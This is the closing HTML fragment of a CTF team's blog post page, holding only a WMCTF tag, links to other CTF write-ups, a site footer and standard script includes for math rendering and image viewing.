</span></span></code></pre></td></tr></table></div></div><div class=blog-tags><a href=https://su-team.cn/tags/wmctf/>WMCTF</a>&nbsp;</div><h4 class=see-also>See also</h4><ul><li><a href=/post/wmctf-2025-su-wu/>2025 WMCTF SU WriteUp</a></li><li><a href=/post/wmctf-2020-su-wu/>WMCTF 2020 SU Write-Up</a></li></ul></article><ul class="pager blog-pager"><li class=previous><a href=https://su-team.cn/post/zer0ptsctf-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 Zer0ptsCTF SU Writeup">&larr; Previous Post</a></li><li class=next><a href=https://su-team.cn/post/gyb-2023-su-wu/ data-toggle=tooltip data-placement=top title="2023 贵阳大数据网络安全精英对抗赛 SU Writeup">Next Post &rarr;</a></li></ul></div></div></div><footer><div class=container><div class=row><div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1"><ul class="list-inline text-center footer-links"><li><a href=https://ctftime.org/team/29641 title=CTFTime><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<img src=https://su-team.cn/img/ctftime.svg title=CTFTime alt=CTFTime style=width:60%;height:60%;position:absolute;top:20%;left:20%></span></a></li><li><a href=mailto:suers_xctf@126.com title="Email me"><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fas fa-envelope fa-stack-1x fa-inverse"></i></span></a></li><li><a href=https://github.com/team-su title=GitHub><span class="fa-stack fa-lg"><i class="fas fa-circle fa-stack-2x"></i>
<i class="fab fa-github fa-stack-1x fa-inverse"></i></span></a></li></ul><p class="credits copyright text-muted"><a href=https://su-team.cn>SUer</a>
&nbsp;&bull;&nbsp;&copy;
2026
&nbsp;&bull;&nbsp;
<a href=https://su-team.cn/>su-team</a></p><p class="credits theme-by text-muted"><a href=https://gohugo.io>Hugo v0.148.2</a> powered &nbsp;&bull;&nbsp; Theme <a href=https://github.com/halogenica/beautifulhugo>Beautiful Hugo</a> adapted from <a href=https://deanattali.com/beautiful-jekyll/>Beautiful Jekyll</a></p></div></div></div></footer><script defer src=https://su-team.cn/js/katex.min.js></script><script defer src=https://su-team.cn/js/auto-render.min.js></script><script src=https://su-team.cn/js/jquery-3.7.0.slim.min.js></script><script src=https://su-team.cn/js/bootstrap.min.js></script><script>document.addEventListener("DOMContentLoaded",function(){renderMathInElement(document.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1},{left:"\\begin{equation}",right:"\\end{equation}",display:!0},{left:"\\begin{align}",right:"\\end{align}",display:!0},{left:"\\begin{alignat}",right:"\\end{alignat}",display:!0},{left:"\\begin{gather}",right:"\\end{gather}",display:!0},{left:"\\(",right:"\\)",display:!1},{left:"\\[",right:"\\]",display:!0}]})})</script><script src=https://su-team.cn/js/main.js></script><script src=https://su-team.cn/js/photoswipe.min.js></script><script src=https://su-team.cn/js/photoswipe-ui-default.min.js></script><script src=https://su-team.cn/js/load-photoswipe.js></script></body></html>